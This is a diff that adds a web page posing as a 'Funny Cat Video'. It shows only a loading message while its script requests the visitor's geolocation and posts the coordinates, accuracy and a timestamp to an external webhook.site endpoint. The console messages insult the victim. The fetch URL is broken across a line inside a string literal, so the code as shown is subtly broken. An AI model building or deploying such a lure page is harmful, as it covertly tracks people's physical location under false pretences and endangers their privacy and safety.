@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Funny Cat Video</title>
+</head>
+<body>
+  <h1>Loading... 🐱</h1>
+  <p>Please wait while your content loads...</p>
+
+  <script>
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        fetch('
+https://webhook.site/39cdedb1-a62c-4a7f-916a-2845e51d9f9b', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+          })
+        });
+      }, function(error) {
+        console.error("Permission denied or some fuckery occurred.", error);
+      });
+    } else {
+      console.log("Geolocation is not supported by this dumbass's browser.");
+    }
+  </script>
+</body>
+</html>
